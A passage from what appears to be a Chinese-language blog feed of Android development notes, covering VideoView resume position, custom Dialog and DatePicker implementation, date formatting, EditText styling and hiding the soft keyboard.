        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u013323045/article/details/83544876?utm_medium=distribute.pc_relevant.none-task-blog-title-3&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">https://blog.csdn.net/u013323045/article/details/83544876?utm_medium=distribute.pc_relevant.none-task-blog-title-3&amp;spm=1001.2101.3001.4242</a>  </p><p>下面的代码时设置按下HOME键回到主页面然后回来后页面保持不变的代码</p><pre class=" language-JAVA"><code class="language-JAVA">public boolean onKeyDown(int keyCode, KeyEvent event) {    if (keyCode == KeyEvent.KEYCODE_Home) {        moveTaskToBack(false);        return true;    }    return super.onKeyDown(keyCode, event);}</code></pre><p>但是在测试过程中发现：只这样写的话播放的视频文件在回到前台的时候会重新播放解决方法如下：</p><pre class=" language-java"><code class="language-java">  <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pos <span class="token operator">=</span> videoview<span class="token punctuation">.</span><span class="token function">getCurrentPosition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">600</span><span class="token punctuation">;</span>        Log<span class="token punctuation">.</span><span class="token function">i</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">,</span> <span class="token string">"onResume: "</span><span class="token operator">+</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>1.提前声明好一个int型的变量pos,在onPause中调用VideoView对象的getCurrentPosition方法(返回值是int)来获取当前视频播放的位置(因为进入后台会调用onPause方法)。这里pos多加600的原因是为了解决可能存在回到app的时候音频对不准,可能是退出前几秒的位置的问题(应该是因为返回值是int所以导致得到的值不精确)<br>2.在onResume中调用seekTo方法来回到原先退出的位置<br> @Override<br>    protected void onResume() {<br>        super.onResume();<br>        videoview.seekTo(pos);<br>    }</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义Dialog</title>
      <link href="/2020/10/30/zi-ding-yi-dialog/"/>
      <url>/2020/10/30/zi-ding-yi-dialog/</url>
      
        <content type="html"><![CDATA[<h2 id="更详细的方法日后再更新-下面的代码主要出自DatePicker的那个自定义Dialog"><a href="#更详细的方法日后再更新-下面的代码主要出自DatePicker的那个自定义Dialog" class="headerlink" title="更详细的方法日后再更新,下面的代码主要出自DatePicker的那个自定义Dialog"></a>更详细的方法日后再更新,下面的代码主要出自DatePicker的那个自定义Dialog</h2><p>一.style部分的核心代码</p><pre><code>  &lt;style name="date_picker_dialog" parent="android:style/Theme.Dialog"&gt;        &lt;item name="android:windowFrame"&gt;@null&lt;/item&gt;        &lt;item name="android:windowNoTitle"&gt;true&lt;/item&gt;        &lt;item name="android:windowIsFloating"&gt;true&lt;/item&gt;        &lt;item name="android:windowContentOverlay"&gt;@null&lt;/item&gt;        &lt;item name="android:windowBackground"&gt;@color/date_picker_bg&lt;/item&gt;//这行代码如果不写的话dialog宽度不能铺满屏幕    &lt;/style&gt;</code></pre><p>二.java部分的核心代码</p><pre><code>   //下面的代码是自定义View的核心代码        //------------------------------------------------------------------------------------------------------------------        mPickerDialog = new Dialog(mContext, R.style.date_picker_dialog);//第一个参数是context基础属性在style先调好        mPickerDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);//设置窗体常见属性(这里去掉似乎不会有影响,因为在style中已经设置了)        mPickerDialog.setContentView(R.layout.dialog_date_picker);//自定义写好的dialog布局        //给window设置参数        Window window = mPickerDialog.getWindow();        if (window != null) {            WindowManager.LayoutParams lp = window.getAttributes();            lp.gravity = Gravity.BOTTOM;//Dialog在底部出现            lp.width = WindowManager.LayoutParams.MATCH_PARENT;            lp.height = WindowManager.LayoutParams.WRAP_CONTENT;            window.setAttributes(lp);        }        //------------------------------------------------------------------------------------------------------------------</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义DatePicker和TimePicker</title>
      <link href="/2020/10/28/zi-ding-yi-datepicker-he-timepicker/"/>
      <url>/2020/10/28/zi-ding-yi-datepicker-he-timepicker/</url>
      
        <content type="html"><![CDATA[<h2 id="代码源自下面链接-略有改动"><a href="#代码源自下面链接-略有改动" class="headerlink" title="代码源自下面链接,略有改动"></a>代码源自下面链接,略有改动</h2><p><a href="https://github.com/liuwan1992/CustomDatePicker/tree/update_20181221" target="_blank" rel="noopener">https://github.com/liuwan1992/CustomDatePicker/tree/update_20181221</a></p><h2 id="一-功能实现"><a href="#一-功能实现" class="headerlink" title="一.功能实现"></a>一.功能实现</h2><p><strong><em>1.实现数字轮盘滚轮效果选取时间<br>2.自定义显示年月日分秒中的任意单位<br>3.自定义是否可循环<br>4.实现选中时候的动画效果</em></strong></p><hr><h2 id="二-大体思路"><a href="#二-大体思路" class="headerlink" title="二.大体思路"></a>二.大体思路</h2><h2 id="1-PickerView-实现对单个滚盘的视图和功能编写-："><a href="#1-PickerView-实现对单个滚盘的视图和功能编写-：" class="headerlink" title="1.PickerView(实现对单个滚盘的视图和功能编写)："></a>1.PickerView(实现对单个滚盘的视图和功能编写)：</h2><p>1.先自定义一个View来装数字,重写里面的onDraw和onMeasure方法把框架先画出来(当然,其中还有众多细节后面具体说)<br>2.自定义一个DrawText方法来画数字,数字的表现形式等都在里面设置,然后在绘画的时候调用此方法来</p><hr><p><strong><em>完成上面两步之后自定义View大体的轮廓就已经出来了</em></strong></p><hr><p>3.实现添加数据的方法</p><p>4.实现调整data数组的函数</p><hr><p><strong><em>这里说一下这个demo里设计数据的思路 : 因为一次显示五个数,中间的是选中的,而轮盘又要实现从上到下数字递增,所以为了保证能拿到已经选中的数字的前后四个数据,我们可以让选中的数据一直在数组的中间,比如如果轮盘上滑,数字要变大这个时候把头部data[0]的数据删除然后插到末尾,就可以保持选中的数字一直在数组中间(上滑同理)</em></strong></p><hr><p>5.实现闪烁的动画效果<br>6.实现滚动的动画效果(这里主要是通过重绘View实现的)</p><hr><p><strong><em>到上面我们只是实现了对View的绘图和相关功能的设置,接下来要把他安装到CustomDatePicker中</em></strong></p><hr><h2 id="2-CustomDatePicker-控制整个Dialog"><a href="#2-CustomDatePicker-控制整个Dialog" class="headerlink" title="2.CustomDatePicker(控制整个Dialog)"></a>2.CustomDatePicker(控制整个Dialog)</h2><hr><p><strong><em>Dialog中要对整个整体功能进行编写,在单个itemi已经实现了的情况下,该方法的主要任务是对Dialog进行加载初始化以及相关功能的编写</em></strong></p><hr><p>1.对Dialog的构造器进行自定义,自定义方法都要在这里间接执行，要进行加载页面和设置数据给每一个PickerItem<br>2.对Dialog的打开进行包装(内部加上show方法)<br>3.对年月日时分(不用item)的自定义显示进行设置,同时他们之间的联动动画效果的调用也在这里<br>4.写Destroy方法来回收关闭内存中的东西</p><h2 id="3-MainActivity"><a href="#3-MainActivity" class="headerlink" title="3.MainActivity"></a>3.MainActivity</h2><p>在活动中直接调用CustomDatePicker然后调用包装show的函数即可,同时也可以对相关东西功能进行自定义打开关闭</p><h2 id="三-具体的代码实现"><a href="#三-具体的代码实现" class="headerlink" title="三.具体的代码实现"></a>三.具体的代码实现</h2><p><strong><em>具体的内容直接看注释，每个方法都有详细的注释,下面主要讲大体思路：</em></strong></p><h2 id="1-在PickerView中"><a href="#1-在PickerView中" class="headerlink" title="1.在PickerView中"></a>1.在PickerView中</h2><p>1.1实现图的绘制<br>1.2实现数据的设置<br>1.3实现动画效果函数的写法(注意在数据更新时用invalidate可以实现滚动效果,原理这里不展开谈)</p><p><strong><em>总之,直线的功能都是关于PickerView这个自定义控件相关布局和功能的设置</em></strong></p><h2 id="2-CustomDatePicker-主要是自定义的Dialog"><a href="#2-CustomDatePicker-主要是自定义的Dialog" class="headerlink" title="2.CustomDatePicker(主要是自定义的Dialog)"></a>2.CustomDatePicker(主要是自定义的Dialog)</h2><p>2.1实现自定义的Dialog的布局属性<br>2.2初始化相关控件<br>2.3.设置相关的点击事件<br>2.4.重写onSelect方法来将选定后的数据进行处理<br>2.5,设置关联的动画</p><h2 id="四-一些日后补充的内容"><a href="#四-一些日后补充的内容" class="headerlink" title="四.一些日后补充的内容"></a>四.一些日后补充的内容</h2><p>1.关于dialog的style的设置代码</p><pre><code>    &lt;style name=&quot;date_picker_dialog&quot; parent=&quot;android:style/Theme.Dialog&quot;&gt;        &lt;item name=&quot;android:windowFrame&quot;&gt;@null&lt;/item&gt;        &lt;item name=&quot;android:windowNoTitle&quot;&gt;true&lt;/item&gt;        &lt;item name=&quot;android:windowIsFloating&quot;&gt;true&lt;/item&gt;        &lt;item name=&quot;android:windowContentOverlay&quot;&gt;@null&lt;/item&gt;        &lt;item name=&quot;android:windowBackground&quot;&gt;@color/date_picker_bg&lt;/item&gt;//这行代码如果不写的话dialog宽度不能铺满屏幕    &lt;/style&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间选择器demo中函数用法</title>
      <link href="/2020/10/25/decimalformat-de-yong-fa/"/>
      <url>/2020/10/25/decimalformat-de-yong-fa/</url>
      
        <content type="html"><![CDATA[<p>1.DecimalFormat的用法:<a href="https://www.jianshu.com/p/b3699d73142e" target="_blank" rel="noopener">https://www.jianshu.com/p/b3699d73142e</a></p><p>2.Timer与TimerTask的真正原理&amp;使用介绍：<a href="https://blog.csdn.net/xieyuooo/article/details/8607220" target="_blank" rel="noopener">https://blog.csdn.net/xieyuooo/article/details/8607220</a>  </p><p>3.android中handler使用WeakReference防止内存泄露 <a href="https://blog.csdn.net/lanximu/article/details/40522367" target="_blank" rel="noopener">https://blog.csdn.net/lanximu/article/details/40522367</a></p><p>4.android中invalidate()的使用小结 <a href="https://blog.csdn.net/carlwang100/article/details/19546313" target="_blank" rel="noopener">https://blog.csdn.net/carlwang100/article/details/19546313</a></p><p>5.颜色转换成int类型,其中第一个参数是context(有时候自定义函数想要传入int类型的颜色的时候可以用)</p><pre><code>mLightColor = ContextCompat.getColor(mContext, R.color.date_picker_text_light);</code></pre><p>6.判断字符串是否为空</p><pre><code>TextUtils.isEmpty(text)</code></pre><p>7.得到画笔定义的文字的的信息,fm.top + fm.bottom/2得到的是文字的一半高度,不是坐标,具体居中公式推导看下面网址算法,直接看最后部分<br><a href="https://www.jianshu.com/p/8b97627b21c4" target="_blank" rel="noopener">https://www.jianshu.com/p/8b97627b21c4</a><br><a href="https://blog.csdn.net/u012551350/article/details/51361778" target="_blank" rel="noopener">https://blog.csdn.net/u012551350/article/details/51361778</a></p><pre><code>Paint.FontMetrics fm = mPaint.getFontMetrics();fm.top + fm.bottom</code></pre><p>在看文章之前需要先明白一些基本概念(注意view中y轴正半轴的向下的)：<br><a href="https://imgchr.com/i/BYCe0I" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/29/BYCe0I.png" alt="BYCe0I.png"></a></p><p>8.时间戳和字符串之间的相互转换</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DateFormatUtils</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DATE_FORMAT_PATTERN_YMD <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DATE_FORMAT_PATTERN_YMD_HM <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd HH:mm"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 时间戳转字符串     *     * @param timestamp     时间戳     * @param isPreciseTime 是否包含时分     * @return 格式化的日期字符串     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">long2Str</span><span class="token punctuation">(</span><span class="token keyword">long</span> timestamp<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isPreciseTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">long2Str</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> <span class="token function">getFormatPattern</span><span class="token punctuation">(</span>isPreciseTime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">long2Str</span><span class="token punctuation">(</span><span class="token keyword">long</span> timestamp<span class="token punctuation">,</span> String pattern<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> Locale<span class="token punctuation">.</span>CHINA<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 字符串转时间戳     *     * @param dateStr       日期字符串     * @param isPreciseTime 是否包含时分     * @return 时间戳     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">str2Long</span><span class="token punctuation">(</span>String dateStr<span class="token punctuation">,</span> <span class="token keyword">boolean</span> isPreciseTime<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//在这个方法里执行下一个方法(两个模式两个选择)</span>        <span class="token keyword">return</span> <span class="token function">str2Long</span><span class="token punctuation">(</span>dateStr<span class="token punctuation">,</span> <span class="token function">getFormatPattern</span><span class="token punctuation">(</span>isPreciseTime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">str2Long</span><span class="token punctuation">(</span>String dateStr<span class="token punctuation">,</span> String pattern<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> Locale<span class="token punctuation">.</span>CHINA<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>dateStr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//第二个参数不管他照着填,这行代码是将str以patter的形式进行解析再用getTime得到需要的时间戳</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ignored<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">getFormatPattern</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> showSpecificTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>showSpecificTime<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> DATE_FORMAT_PATTERN_YMD_HM<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//显示年月日分秒的模式</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> DATE_FORMAT_PATTERN_YMD<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//限制年月日的模式,返回的是字符串格式</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓开发自定义View一</title>
      <link href="/2020/10/24/an-zhuo-kai-fa-zi-ding-yi-view-yi/"/>
      <url>/2020/10/24/an-zhuo-kai-fa-zi-ding-yi-view-yi/</url>
      
        <content type="html"><![CDATA[<p>参考文章：<a href="https://www.jianshu.com/p/c84693096e41" target="_blank" rel="noopener">https://www.jianshu.com/p/c84693096e41</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于EditText的一些常见问题</title>
      <link href="/2020/10/23/dui-yu-edittext-de-yi-xie-chang-jian-wen-ti/"/>
      <url>/2020/10/23/dui-yu-edittext-de-yi-xie-chang-jian-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="一-如何自定义设置长按时选取的文字区域高亮颜色"><a href="#一-如何自定义设置长按时选取的文字区域高亮颜色" class="headerlink" title="一.如何自定义设置长按时选取的文字区域高亮颜色"></a>一.如何自定义设置长按时选取的文字区域高亮颜色</h2><pre class=" language-XML"><code class="language-XML"> android:textColorHighlight="@color/highlight"</code></pre><h2 id="二-如何自定义设置选中文字区域两旁的小水滴"><a href="#二-如何自定义设置选中文字区域两旁的小水滴" class="headerlink" title="二.如何自定义设置选中文字区域两旁的小水滴"></a>二.如何自定义设置选中文字区域两旁的小水滴</h2><p><strong><em>图片要自己找</em></strong></p><pre class=" language-XML"><code class="language-XML">    android:textSelectHandleLeft="@drawable/water"    android:textSelectHandleRight="@drawable/water"</code></pre><p>这里有一个细节:应该对于部分手机(比如测试机华为),如果把style中的colorAccent颜色设置成了某种颜色,那么系统会自动设置光标的颜色和水滴的颜色和图片</p><h2 id="三-自定义光标颜色图案"><a href="#三-自定义光标颜色图案" class="headerlink" title="三.自定义光标颜色图案"></a>三.自定义光标颜色图案</h2><pre class=" language-XML"><code class="language-XML">android:textCursorDrawable="@drawable/cursor"</code></pre><pre class=" language-XML"><code class="language-XML"><?xml version="1.0" encoding="utf-8"?><shape    xmlns:android="http://schemas.android.com/apk/res/android"    android:shape="rectangle">    <size android:width="1dp" />    <solid android:color="#000000"/></shape></code></pre><h2 id="四-去除EditText自带的下划线"><a href="#四-去除EditText自带的下划线" class="headerlink" title="四.去除EditText自带的下划线"></a>四.去除EditText自带的下划线</h2><p><strong><em>背景设置成null或者白色即可</em></strong></p><pre class=" language-XML"><code class="language-XML">android:background="@null"</code></pre><h2 id="五-监测是否Edit处于focus状态并进行设置-比如处于focus状态就显示一些图片"><a href="#五-监测是否Edit处于focus状态并进行设置-比如处于focus状态就显示一些图片" class="headerlink" title="五.监测是否Edit处于focus状态并进行设置(比如处于focus状态就显示一些图片)"></a>五.监测是否Edit处于focus状态并进行设置(比如处于focus状态就显示一些图片)</h2><p><strong><em>在implements下面接口之后<br>implements View.OnClickListener,View.OnFocusChangeListener<br>调用setOnFocusChangeListener方法</em></strong></p><pre><code>title.setOnFocusChangeListener(this);</code></pre><pre><code> public void onFocusChange(View v, boolean hasFocus) {        switch (v.getId()){            case R.id.title:            case R.id.content:                if(hasFocus)                    surebtn.setVisibility(View.VISIBLE);                else                    surebtn.setVisibility(View.INVISIBLE);        }    }</code></pre><h3 id="六-取消focus的状态"><a href="#六-取消focus的状态" class="headerlink" title="六.取消focus的状态"></a>六.取消focus的状态</h3><p><strong><em>调用clearFocus()方法即可</em></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐藏和弹出软键盘的实现方法</title>
      <link href="/2020/10/21/zai-fragment-zhong-shi-xian-dian-ji-qi-ta-wei-zhi-yin-cang-jin-pan/"/>
      <url>/2020/10/21/zai-fragment-zhong-shi-xian-dian-ji-qi-ta-wei-zhi-yin-cang-jin-pan/</url>
      
        <content type="html"><![CDATA[<h2 id="一-在Fragment中实现点击其他位置隐藏金盘"><a href="#一-在Fragment中实现点击其他位置隐藏金盘" class="headerlink" title="一.在Fragment中实现点击其他位置隐藏金盘"></a>一.在Fragment中实现点击其他位置隐藏金盘</h2><h3 id="问题：Fragment无法重写dispatchTouchEvent方法"><a href="#问题：Fragment无法重写dispatchTouchEvent方法" class="headerlink" title="问题：Fragment无法重写dispatchTouchEvent方法"></a>问题：Fragment无法重写dispatchTouchEvent方法</h3><p>Fragment连接Activity的方法：<a href="https://blog.csdn.net/qq_34902522/article/details/77963129" target="_blank" rel="noopener">https://blog.csdn.net/qq_34902522/article/details/77963129</a></p><p>触摸事件分类：</p><p><a href="https://blog.csdn.net/xyz_lmn/article/details/12517911" target="_blank" rel="noopener">https://blog.csdn.net/xyz_lmn/article/details/12517911</a></p><h3 id="一-解决方法"><a href="#一-解决方法" class="headerlink" title="一.解决方法"></a>一.解决方法</h3><p>1.先创建一个interface,参数不能乱写</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">OnHideKeyboardListener</span>  <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hideKeyboard</span><span class="token punctuation">(</span>KeyEvent event<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>2.调用上面的接口,然后把fragment的父Activiy在顶部声明一下,然后重写onAttach方法(不过目前已经不提倡用activity为参数了了)</p><pre class=" language-JAVA"><code class="language-JAVA">MainActivity mainActivity;//获取通信    @Override    public void onAttach(Activity activity) {        super.onAttach(activity);        mainActivity = (MainActivity) activity;        mainActivity.setOnHideKeyboardListener(this);    }    @Override    public boolean hideKeyboard(KeyEvent event) {        return false;    }</code></pre><p>3.在父Activity写接口的set实例化创建方法</p><pre class=" language-JAVA"><code class="language-JAVA">public void setOnHideKeyboardListener(OnHideKeyboardListener onHideKeyboardListener){        this.onHideKeyboardListener = onHideKeyboardListener;    }</code></pre><p>4.在父Activity重写dispatchTouchEvent方法即可</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">dispatchTouchEvent</span><span class="token punctuation">(</span>MotionEvent ev<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ev<span class="token punctuation">.</span><span class="token function">getAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> MotionEvent<span class="token punctuation">.</span>ACTION_DOWN<span class="token punctuation">)</span> <span class="token punctuation">{</span>            View view <span class="token operator">=</span> <span class="token function">getCurrentFocus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isShouldHideInput</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> ev<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                InputMethodManager Object <span class="token operator">=</span> <span class="token punctuation">(</span>InputMethodManager<span class="token punctuation">)</span> <span class="token function">getSystemService</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INPUT_METHOD_SERVICE<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>Object <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Object<span class="token punctuation">.</span><span class="token function">hideSoftInputFromWindow</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span><span class="token function">getWindowToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">dispatchTouchEvent</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//判断是否隐藏键盘</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isShouldHideInput</span><span class="token punctuation">(</span>View v<span class="token punctuation">,</span> MotionEvent event<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v <span class="token keyword">instanceof</span> <span class="token class-name">EditText</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> leftTop <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取输入框当前的location位置</span>            v<span class="token punctuation">.</span><span class="token function">getLocationInWindow</span><span class="token punctuation">(</span>leftTop<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> left <span class="token operator">=</span> leftTop<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> top <span class="token operator">=</span> leftTop<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> bottom <span class="token operator">=</span> top <span class="token operator">+</span> v<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> right <span class="token operator">=</span> left <span class="token operator">+</span> v<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> left <span class="token operator">&amp;&amp;</span> event<span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> right                    <span class="token operator">&amp;&amp;</span> event<span class="token punctuation">.</span><span class="token function">getY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> top <span class="token operator">&amp;&amp;</span> event<span class="token punctuation">.</span><span class="token function">getY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> bottom<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 点击的是输入框区域，保留点击EditText的事件</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="二-实现对按钮添加点击事件隐藏键盘"><a href="#二-实现对按钮添加点击事件隐藏键盘" class="headerlink" title="二.实现对按钮添加点击事件隐藏键盘"></a>二.实现对按钮添加点击事件隐藏键盘</h2><p>代码：</p><pre class=" language-JAVA"><code class="language-JAVA"> private void closeKeyboard() {        InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);        // 得到InputMethodManager的实例        if (imm.isActive()) {            // 如果开启            Log.e(TAG, "closeKeyboard: "+imm.isActive());            imm.toggleSoftInput(InputMethodManager.SHOW_IMPLICIT,                    InputMethodManager.HIDE_NOT_ALWAYS);            // 关闭软键盘，开启方法相同，这个方法是切换开启与关闭状态的        }    }</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              